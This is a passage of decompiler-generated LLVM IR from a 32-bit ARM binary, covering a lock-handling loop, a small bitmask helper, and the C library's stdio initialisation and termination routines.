  %v3_15a64 = inttoptr i32 %v2_15a64 to i32*
  store i32 %v0_15a64, i32* %v3_15a64, align 4
  br i1 %v2_15a5c, label %dec_label_pc_15a6c, label %dec_label_pc_15acc

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_15a30
  %v0_15a6c = load i32, i32* %r3.global-to-local, align 4
  %v1_15a6c = load i32, i32* %r0.global-to-local, align 4
  %v2_15a6c = add i32 %v1_15a6c, 8
  %v3_15a6c = inttoptr i32 %v2_15a6c to i32*
  store i32 %v0_15a6c, i32* %v3_15a6c, align 4
  %v0_15a70 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15a70, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15a74

dec_label_pc_15a74:                               ; preds = %dec_label_pc_15aa4.dec_label_pc_15a74_crit_edge, %dec_label_pc_15a6c
  %v0_15a74 = phi i32 [ %v0_15a74.pre, %dec_label_pc_15aa4.dec_label_pc_15a74_crit_edge ], [ %v0_15a70, %dec_label_pc_15a6c ]
  %v1_15a74 = inttoptr i32 %v0_15a74 to i32*
  %v2_15a74 = load i32, i32* %v1_15a74, align 4
  store i32 %v2_15a74, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15a74, i32* %r2.global-to-local, align 4
  %v2_15a8083 = load i32, i32* %v1_15a74, align 4
  store i32 %v2_15a8083, i32* %r3.global-to-local, align 4
  %v3_15a8485 = icmp uge i32 %v2_15a8083, %v2_15a74
  store i1 %v3_15a8485, i1* %cpsr_c.global-to-local, align 1
  %v9_15a8491 = icmp eq i32 %v2_15a8083, %v2_15a74
  br i1 %v9_15a8491, label %dec_label_pc_15a8c, label %dec_label_pc_15aa4

dec_label_pc_15a8c:                               ; preds = %dec_label_pc_15a74, %dec_label_pc_15a8c.dec_label_pc_15a80_crit_edge
  %v0_15a8c92 = phi i32 [ %v1_15a84.pre, %dec_label_pc_15a8c.dec_label_pc_15a80_crit_edge ], [ %v2_15a74, %dec_label_pc_15a74 ]
  store i32 %v0_15a8c92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15a9c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15a9c, label %dec_label_pc_15aa0, label %dec_label_pc_15a8c.dec_label_pc_15a80_crit_edge

dec_label_pc_15a8c.dec_label_pc_15a80_crit_edge:  ; preds = %dec_label_pc_15a8c
  %v0_15a80.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15a84.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15a80 = inttoptr i32 %v0_15a80.pre to i32*
  %v2_15a80 = load i32, i32* %v1_15a80, align 4
  store i32 %v2_15a80, i32* %r3.global-to-local, align 4
  %v3_15a84 = icmp uge i32 %v2_15a80, %v1_15a84.pre
  store i1 %v3_15a84, i1* %cpsr_c.global-to-local, align 1
  %v9_15a84 = icmp eq i32 %v2_15a80, %v1_15a84.pre
  br i1 %v9_15a84, label %dec_label_pc_15a8c, label %dec_label_pc_15aa4

dec_label_pc_15aa0:                               ; preds = %dec_label_pc_15a8c
  %v0_15aa0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15aa0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15aa4

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a74, %dec_label_pc_15a8c.dec_label_pc_15a80_crit_edge, %dec_label_pc_15aa0
  %v0_15aac = phi i32 [ %v0_15aa0, %dec_label_pc_15aa0 ], [ %v2_15a8083, %dec_label_pc_15a74 ], [ %v2_15a80, %dec_label_pc_15a8c.dec_label_pc_15a80_crit_edge ]
  %v1_15aa4 = phi i32 [ %v0_15aa0, %dec_label_pc_15aa0 ], [ %v2_15a74, %dec_label_pc_15a74 ], [ %v1_15a84.pre, %dec_label_pc_15a8c.dec_label_pc_15a80_crit_edge ]
  %v3_15aa4 = icmp uge i32 %v0_15aac, %v1_15aa4
  store i1 %v3_15aa4, i1* %cpsr_c.global-to-local, align 1
  %v9_15aa4 = icmp eq i32 %v0_15aac, %v1_15aa4
  br i1 %v9_15aa4, label %dec_label_pc_15aac, label %dec_label_pc_15aa4.dec_label_pc_15a74_crit_edge

dec_label_pc_15aa4.dec_label_pc_15a74_crit_edge:  ; preds = %dec_label_pc_15aa4
  %v0_15a74.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15a74

dec_label_pc_15aac:                               ; preds = %dec_label_pc_15aa4
  %v2_15aac = icmp ne i32 %v1_15aa4, 0
  store i1 %v2_15aac, i1* %cpsr_c.global-to-local, align 1
  %v7_15ab0 = icmp slt i32 %v1_15aa4, 2
  br i1 %v7_15ab0, label %dec_label_pc_15acc, label %dec_label_pc_15ab4

dec_label_pc_15ab4:                               ; preds = %dec_label_pc_15aac
  %v0_15ab4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15ab4, i32* %r0.global-to-local, align 4
  %v0_15ab8 = load i32, i32* @r1, align 4
  %v1_15ab8 = add i32 %v0_15ab8, 129
  store i32 %v1_15ab8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15acc

dec_label_pc_15acc:                               ; preds = %dec_label_pc_15a30, %dec_label_pc_15ab4, %dec_label_pc_15aac
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15ad0 = load i32, i32* @r8, align 4
  %v2_15ad0 = add i32 %v0_15ad0, 160
  %v3_15ad0 = inttoptr i32 %v2_15ad0 to i32*
  %v4_15ad0 = load i32, i32* %v3_15ad0, align 4
  store i32 %v4_15ad0, i32* %r0.global-to-local, align 4
  %v1_15ad4 = add i32 %v4_15ad0, 4
  %v2_15ad4 = inttoptr i32 %v1_15ad4 to i32*
  %v3_15ad4 = load i32, i32* %v2_15ad4, align 4
  %v1_15ad8 = add i32 %v3_15ad4, -1
  store i32 %v1_15ad8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15adc = icmp eq i32 %v1_15ad8, 0
  store i32 %v1_15ad8, i32* %v2_15ad4, align 4
  br i1 %v2_15adc, label %dec_label_pc_15ae8, label %dec_label_pc_15b50

dec_label_pc_15ae8:                               ; preds = %dec_label_pc_15acc
  %v0_15ae8 = load i32, i32* %r3.global-to-local, align 4
  %v1_15ae8 = load i32, i32* %r0.global-to-local, align 4
  %v2_15ae8 = add i32 %v1_15ae8, 8
  %v3_15ae8 = inttoptr i32 %v2_15ae8 to i32*
  store i32 %v0_15ae8, i32* %v3_15ae8, align 4
  %v0_15aec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15aec, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15af0

dec_label_pc_15af0:                               ; preds = %dec_label_pc_15b20.dec_label_pc_15af0_crit_edge, %dec_label_pc_15ae8
  %v0_15af0 = phi i32 [ %v0_15af0.pre, %dec_label_pc_15b20.dec_label_pc_15af0_crit_edge ], [ %v0_15aec, %dec_label_pc_15ae8 ]
  %v1_15af0 = inttoptr i32 %v0_15af0 to i32*
  %v2_15af0 = load i32, i32* %v1_15af0, align 4
  store i32 %v2_15af0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15af0, i32* %r2.global-to-local, align 4
  %v2_15afc71 = load i32, i32* %v1_15af0, align 4
  store i32 %v2_15afc71, i32* %r3.global-to-local, align 4
  %v3_15b0073 = icmp uge i32 %v2_15afc71, %v2_15af0
  store i1 %v3_15b0073, i1* %cpsr_c.global-to-local, align 1
  %v9_15b0079 = icmp eq i32 %v2_15afc71, %v2_15af0
  br i1 %v9_15b0079, label %dec_label_pc_15b08, label %dec_label_pc_15b20

dec_label_pc_15b08:                               ; preds = %dec_label_pc_15af0, %dec_label_pc_15b08.dec_label_pc_15afc_crit_edge
  %v0_15b0880 = phi i32 [ %v1_15b00.pre, %dec_label_pc_15b08.dec_label_pc_15afc_crit_edge ], [ %v2_15af0, %dec_label_pc_15af0 ]
  store i32 %v0_15b0880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15b18 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15b18, label %dec_label_pc_15b1c, label %dec_label_pc_15b08.dec_label_pc_15afc_crit_edge

dec_label_pc_15b08.dec_label_pc_15afc_crit_edge:  ; preds = %dec_label_pc_15b08
  %v0_15afc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15b00.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15afc = inttoptr i32 %v0_15afc.pre to i32*
  %v2_15afc = load i32, i32* %v1_15afc, align 4
  store i32 %v2_15afc, i32* %r3.global-to-local, align 4
  %v3_15b00 = icmp uge i32 %v2_15afc, %v1_15b00.pre
  store i1 %v3_15b00, i1* %cpsr_c.global-to-local, align 1
  %v9_15b00 = icmp eq i32 %v2_15afc, %v1_15b00.pre
  br i1 %v9_15b00, label %dec_label_pc_15b08, label %dec_label_pc_15b20

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b08
  %v0_15b1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15b1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15b20

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15af0, %dec_label_pc_15b08.dec_label_pc_15afc_crit_edge, %dec_label_pc_15b1c
  %v0_15b28 = phi i32 [ %v0_15b1c, %dec_label_pc_15b1c ], [ %v2_15afc71, %dec_label_pc_15af0 ], [ %v2_15afc, %dec_label_pc_15b08.dec_label_pc_15afc_crit_edge ]
  %v1_15b20 = phi i32 [ %v0_15b1c, %dec_label_pc_15b1c ], [ %v2_15af0, %dec_label_pc_15af0 ], [ %v1_15b00.pre, %dec_label_pc_15b08.dec_label_pc_15afc_crit_edge ]
  %v3_15b20 = icmp uge i32 %v0_15b28, %v1_15b20
  store i1 %v3_15b20, i1* %cpsr_c.global-to-local, align 1
  %v9_15b20 = icmp eq i32 %v0_15b28, %v1_15b20
  br i1 %v9_15b20, label %dec_label_pc_15b28, label %dec_label_pc_15b20.dec_label_pc_15af0_crit_edge

dec_label_pc_15b20.dec_label_pc_15af0_crit_edge:  ; preds = %dec_label_pc_15b20
  %v0_15af0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15af0

dec_label_pc_15b28:                               ; preds = %dec_label_pc_15b20
  %v2_15b28 = icmp ne i32 %v1_15b20, 0
  store i1 %v2_15b28, i1* %cpsr_c.global-to-local, align 1
  %v7_15b2c = icmp slt i32 %v1_15b20, 2
  br i1 %v7_15b2c, label %dec_label_pc_15b50, label %dec_label_pc_15b30

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15b28
  %v0_15b30 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15b30, i32* %r0.global-to-local, align 4
  %v0_15b34 = load i32, i32* @r1, align 4
  %v1_15b34 = add i32 %v0_15b34, 129
  store i32 %v1_15b34, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15b50

dec_label_pc_15b4c:                               ; preds = %dec_label_pc_15790, %dec_label_pc_15774, %dec_label_pc_1579c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_15b50

dec_label_pc_15b50:                               ; preds = %dec_label_pc_15acc, %dec_label_pc_15b28, %bb57, %dec_label_pc_157d4, %dec_label_pc_15b30, %dec_label_pc_15b4c
  %v0_15b50 = load i32, i32* @r5, align 4
  store i32 %v0_15b50, i32* %r0.global-to-local, align 4
  %v2_15b58 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15b58, i32* %r4.global-to-local, align 4
  store i32 %v6_15734, i32* @r5, align 4
  store i32 %v9_15734, i32* @r6, align 4
  store i32 %v12_15734, i32* @r7, align 4
  store i32 %v15_15734, i32* @r8, align 4
  ret i32 %v0_15b50

; uselistorder directives
  uselistorder i32 %v0_15b1c, { 1, 0, 2 }
  uselistorder i32 %v1_15b00.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15af0, { 1, 0 }
  uselistorder i32 %v0_15aa0, { 1, 0, 2 }
  uselistorder i32 %v1_15a84.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15a74, { 1, 0 }
  uselistorder i32 %v0_15a1c, { 1, 0, 2 }
  uselistorder i32 %v1_15a00.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_159b4, { 1, 0, 2 }
  uselistorder i32 %v1_15998, { 0, 2, 1 }
  uselistorder i32 %v4_15974, { 2, 1, 0, 3 }
  uselistorder i32 %v1_15924.pre, { 2, 1, 0 }
  uselistorder i32 %v0_158a8, { 1, 2, 0 }
  uselistorder i32 %v1_15838, { 1, 0 }
  uselistorder i32 %v0_15838, { 1, 0 }
  uselistorder i32 %v1_15820, { 1, 2, 0, 3 }
  uselistorder i32 %v1_157c4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 52, 5, 6, 7, 8, 9, 11, 10, 53, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 51, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 36, 37, 5, 6, 7, 9, 8, 0, 10, 11, 13, 12, 1, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 16384, { 66, 67, 0, 68, 37, 69, 38, 70, 39, 71, 40, 72, 41, 73, 42, 74, 18, 75, 17, 60, 3, 50, 35, 51, 4, 52, 36, 53, 5, 54, 6, 55, 7, 56, 8, 57, 9, 58, 10, 59, 34, 61, 11, 62, 12, 63, 13, 64, 14, 65, 43, 76, 15, 77, 16, 78, 79, 46, 80, 47, 81, 20, 82, 44, 83, 19, 84, 45, 85, 21, 86, 22, 87, 24, 88, 23, 89, 26, 90, 25, 91, 27, 92, 28, 93, 29, 94, 30, 95, 31, 96, 48, 97, 32, 1, 49, 98, 33, 2 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 14, 0, 13, 12, 11, 2, 1, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 ()* @malloc, { 43, 42, 41, 4, 3, 2, 0, 1, 12, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 9, 8, 7, 6, 5, 15, 14, 13, 11, 10 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 10, 9, 5, 4, 3, 2, 1, 8, 7, 6, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_15b50, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15b4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b08, { 1, 0 }
  uselistorder label %dec_label_pc_15acc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15aa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a8c, { 1, 0 }
  uselistorder label %dec_label_pc_15a30, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_15a20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a08, { 1, 0 }
  uselistorder label %dec_label_pc_159c8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_159b8, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15900, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_15868._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15810, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_157ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15774, { 1, 2, 0 }
}

define i32 @function_15b64(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15b64:
  %v0_15b64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15b64, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15b64
  %v5_15b64 = sdiv i32 %arg2, 16
  %v6_15b64 = and i32 %v5_15b64, %arg1
  %v5_15b68 = sdiv i32 %arg2, 256
  %v6_15b68 = and i32 %v6_15b64, %v5_15b68
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15b64, %bb
  %v9_15b6c = phi i32 [ %arg1, %dec_label_pc_15b64 ], [ %v6_15b68, %bb ]
  ret i32 %v9_15b6c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_15b9c = call i32 @__aeabi_read_tp()
  %v3_15ba0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_15ba0 = sext i16 %v3_15ba0 to i32
  store i32 %v4_15ba0, i32* @r3, align 4
  store i32 %v0_15b9c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_15bac = add i32 %v4_15ba0, %v0_15b9c
  %v3_15bac = inttoptr i32 %v2_15bac to i32*
  %v4_15bac = load i32, i32* %v3_15bac, align 4
  store i32 %v4_15bac, i32* @r6, align 4
  %v1_15bb0 = call i32 @isatty(i32 0)
  %v2_15bb8 = icmp eq i32 %v1_15bb0, 0
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r4, align 4
  br i1 %v2_15bb8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_15bc4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 308) to i16*), align 4
  %v7_15bc4 = zext i16 %v5_15bc4 to i32
  %v2_15bc8 = xor i32 %v7_15bc4, 256
  store i32 %v2_15bc8, i32* @r3, align 4
  %v2_15bcc = trunc i32 %v2_15bc8 to i16
  store i16 %v2_15bcc, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_15bd4 = call i32 @isatty(i32 1)
  %v2_15bd8 = icmp eq i32 %v1_15bd4, 0
  br i1 %v2_15bd8, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_15be0 = load i32, i32* @r4, align 4
  %v2_15be4 = add i32 %v1_15be0, 376
  %v3_15be4 = inttoptr i32 %v2_15be4 to i16*
  %v4_15be4 = load i16, i16* %v3_15be4, align 2
  %v2_15be8 = xor i16 %v4_15be4, 256
  store i16 %v2_15be8, i16* %v3_15be4, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_15bf4 = load i16, i16* @global_var_216f0.341, align 2
  %v4_15bf4 = sext i16 %v3_15bf4 to i32
  %v0_15bf8 = load i32, i32* @r6, align 4
  %v1_15bf8 = load i32, i32* @r5, align 4
  %v3_15bf8 = add i32 %v1_15bf8, %v4_15bf4
  %v4_15bf8 = inttoptr i32 %v3_15bf8 to i32*
  store i32 %v0_15bf8, i32* %v4_15bf8, align 4
  ret i32 %v1_15bd4

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15c14 = load i32, i32* @r4, align 4
  store i32 %v3_15c14, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_15c28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_15c28, i32* %r0.global-to-local, align 4
  %v5_15c28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_15c28, i32* %r1.global-to-local, align 4
  %v8_15c28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -33092) to i32*), align 4
  %v2_15c30 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_15c30, i32* %r3.global-to-local, align 4
  store i32 %v2_15c28, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_15c3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 152) to i32*), align 4
  store i32 %v2_15c28, i32* %r0.global-to-local, align 4
  store i32 %v5_15c28, i32* %r1.global-to-local, align 4
  store i32 %v8_15c28, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_15c4c = inttoptr i32 %v4_15c3c to i32*
  store i32 %v2_15c28, i32* %v1_15c4c, align 4
  %v3_15c4c = add i32 %v4_15c3c, 4
  %v4_15c4c = inttoptr i32 %v3_15c4c to i32*
  %v5_15c4c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15c4c, i32* %v4_15c4c, align 4
  %v6_15c4c = add i32 %v4_15c3c, 8
  %v7_15c4c = inttoptr i32 %v6_15c4c to i32*
  %v8_15c4c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15c4c, i32* %v7_15c4c, align 4
  %v0_15c50 = load i32, i32* %r3.global-to-local, align 4
  %v1_15c50 = inttoptr i32 %v0_15c50 to i32*
  %v2_15c50 = load i32, i32* %v1_15c50, align 4
  store i32 %v2_15c50, i32* %r0.global-to-local, align 4
  %v3_15c50 = add i32 %v0_15c50, 4
  %v4_15c50 = inttoptr i32 %v3_15c50 to i32*
  %v5_15c50 = load i32, i32* %v4_15c50, align 4
  store i32 %v5_15c50, i32* %r1.global-to-local, align 4
  %v6_15c50 = add i32 %v0_15c50, 8
  %v7_15c50 = inttoptr i32 %v6_15c50 to i32*
  %v8_15c50 = load i32, i32* %v7_15c50, align 4
  %v2_15c54 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_15c54, i32* %r3.global-to-local, align 4
  store i32 %v2_15c50, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_15c60 = load i32, i32* %r7.global-to-local, align 4
  %v2_15c60 = add i32 %v0_15c60, 76
  %v3_15c60 = inttoptr i32 %v2_15c60 to i32*
  %v4_15c60 = load i32, i32* %v3_15c60, align 4
  store i32 %v4_15c60, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_15c68 = inttoptr i32 %v4_15c60 to i32*
  %v2_15c68 = load i32, i32* %v1_15c68, align 4
  store i32 %v2_15c68, i32* %r5.global-to-local, align 4
  %v2_15c6c = add i32 %v0_15c60, 160
  %v3_15c6c = inttoptr i32 %v2_15c6c to i32*
  %v4_15c6c = load i32, i32* %v3_15c6c, align 4
  store i32 %v2_15c50, i32* %r0.global-to-local, align 4
  store i32 %v5_15c50, i32* %r1.global-to-local, align 4
  store i32 %v8_15c50, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_15c7c = add i32 %v0_15c60, -33124
  store i32 %v2_15c7c, i32* %sl.global-to-local, align 4
  %v1_15c80 = inttoptr i32 %v4_15c6c to i32*
  store i32 %v2_15c50, i32* %v1_15c80, align 4
  %v3_15c80 = add i32 %v4_15c6c, 4
  %v4_15c80 = inttoptr i32 %v3_15c80 to i32*
  %v5_15c80 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15c80, i32* %v4_15c80, align 4
  %v6_15c80 = add i32 %v4_15c6c, 8
  %v7_15c80 = inttoptr i32 %v6_15c80 to i32*
  %v8_15c80 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15c80, i32* %v7_15c80, align 4
  %v0_15d10.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d1016 = icmp eq i32 %v0_15d10.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15d1818 = add i32 %v0_15d10.pr, 56
  store i32 %v1_15d1818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_15d1016, label %dec_label_pc_15d24, label %dec_label_pc_15c88

dec_label_pc_15c88:                               ; preds = %entry, %.thread10
  %v0_15c88 = phi i32 [ %v3_15d0c, %.thread10 ], [ %v0_15d10.pr, %entry ]
  %v1_15c88 = add i32 %v0_15c88, 64
  %v2_15c88 = inttoptr i32 %v1_15c88 to i32*
  %v3_15c88 = load i32, i32* %v2_15c88, align 4
  store i32 %v3_15c88, i32* %r3.global-to-local, align 4
  %v0_15c8c = call i32 @__aeabi_read_tp()
  store i32 %v0_15c8c, i32* %r0.global-to-local, align 4
  %v1_15c90 = add i32 %v0_15c8c, -1168
  store i32 %v1_15c90, i32* %r6.global-to-local, align 4
  %v3_15c94 = icmp uge i32 %v3_15c88, %v1_15c90
  store i1 %v3_15c94, i1* %cpsr_c.global-to-local, align 1
  %v9_15c94 = icmp eq i32 %v3_15c88, %v1_15c90
  br i1 %v9_15c94, label %.thread1, label %dec_label_pc_15ca8

.thread1:                                         ; preds = %dec_label_pc_15c88
  %v1_15c98 = load i32, i32* %r5.global-to-local, align 4
  %v2_15c98 = add i32 %v1_15c98, 60
  %v3_15c98 = inttoptr i32 %v2_15c98 to i32*
  %v4_15c98 = load i32, i32* %v3_15c98, align 4
  %v2_15c9c = add i32 %v4_15c98, 1
  store i32 %v2_15c9c, i32* %r3.global-to-local, align 4
  store i32 %v2_15c9c, i32* %v3_15c98, align 4
  br label %.thread10

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15c88, %dec_label_pc_15cb4
  %v0_15ca8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ca8 = inttoptr i32 %v0_15ca8 to i32*
  %v2_15ca8 = load i32, i32* %v1_15ca8, align 4
  store i32 %v2_15ca8, i32* %r3.global-to-local, align 4
  %v1_15cac = load i32, i32* %r4.global-to-local, align 4
  %v3_15cac = icmp uge i32 %v2_15ca8, %v1_15cac
  store i1 %v3_15cac, i1* %cpsr_c.global-to-local, align 1
  %v9_15cac = icmp eq i32 %v2_15ca8, %v1_15cac
  br i1 %v9_15cac, label %dec_label_pc_15cb4, label %dec_label_pc_15ccc

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15ca8
  store i32 %v2_15ca8, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15cc4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15cc4, label %dec_label_pc_15cc8, label %dec_label_pc_15ca8

dec_label_pc_15cc8:                               ; preds = %dec_label_pc_15cb4
  %v0_15cc8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15cc8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ccc

dec_label_pc_15ccc:                               ; preds = %dec_label_pc_15ca8, %dec_label_pc_15cc8
  %v0_15ccc = phi i32 [ %v0_15cc8, %dec_label_pc_15cc8 ], [ %v2_15ca8, %dec_label_pc_15ca8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ccc = icmp eq i32 %v0_15ccc, 0
  %v2_15cd8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_15ccc, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_15ccc
  %v1_15cd8 = load i32, i32* %r6.global-to-local, align 4
  %v3_15cd8 = add i32 %v2_15cd8.pre, 64
  %v4_15cd8 = inttoptr i32 %v3_15cd8 to i32*
  store i32 %v1_15cd8, i32* %v4_15cd8, align 4
  %v1_15cdc = load i32, i32* %r1.global-to-local, align 4
  %v2_15cdc = load i32, i32* %r5.global-to-local, align 4
